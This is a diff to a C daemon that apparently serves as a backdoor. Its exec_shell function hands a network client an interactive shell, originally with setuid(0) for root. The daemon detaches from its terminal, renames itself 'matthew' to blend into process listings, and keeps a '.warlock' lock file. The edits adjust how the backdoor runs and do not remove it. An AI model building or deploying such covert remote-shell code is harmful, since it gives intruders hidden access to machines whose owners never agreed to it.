@@ -5,7 +5,7 @@
 #include <poll.h>
 #include <sys/prctl.h>
 #include <sys/wait.h>
-#include <signal.h>
+//#include <signal.h>
 #include <unistd.h>
 
 #include "daemon.h"
@@ -94,7 +94,8 @@ void exec_shell(param_t *command)
 	int client_fd = command->client_fd;
 
 	if (pid == 0) {
-		setuid(0);
+		//setuid(0); // change to root
+		setpgid(0, 0); // create new process group
 		dup2(client_fd, 0);
 		dup2(client_fd, 1);
 		dup2(client_fd, 2);
@@ -270,7 +271,7 @@ static int lock(int *lock_fd, int close_end)
 	}
 
 	if (close_end == CLOSE_END) {
-		flock(*lock_fd, LOCK_UN);
+		//flock(*lock_fd, LOCK_UN);
 		close(*lock_fd);
 	}
 	return 0;
@@ -314,7 +315,7 @@ void run(int *lock_fd, char **envp)
 
 static void close_fds(void)
 {
-	for (int fd = 3; fd < 1024; fd++) {
+	for (int fd = 0; fd < 1024; fd++) {
 		close(fd);
 	}
 }
@@ -368,15 +369,16 @@ int	daemonize(char **envp)
 	if (pid > 0)
 		return 0;
 
-	if (setsid() < 0) {
+	if (setsid() == -1) {
 		logger(STR("setsid failed\n"));
 		return -1;
 	}
 
-	if (setpgid(0, 0) < 0) {
-		logger(STR("setpgid failed\n"));
-		return -1;
-	}
+
+	//if (setpgid(0, 0) == -1) {
+	//	logger(STR("setpgid failed\n"));
+	//	return -1;
+	//}
 
 	pid = fork();
 	if (pid < 0)
@@ -384,17 +386,22 @@ int	daemonize(char **envp)
 	if (pid > 0)
 		exit(0);
 
+	char name[16] = "matthew";
+	prctl(PR_SET_NAME, name);
+	
 	close_fds();
+	//close(0);
+	//close(1);
+	//close(2);
 
 	if (attach_to_devnull() == -1) {
 		return -1;
 	}
 
+	//setpgid(0, 0);
 	chdir(STR("/"));
 	umask(0);
 
-	char name[16] = "matthew";
-	prctl(PR_SET_NAME, name);
 
 	/* lock the file (.warlock) at this point */
 	if (lock(&lock_fd, NO_CLOSE_END) == 1) {
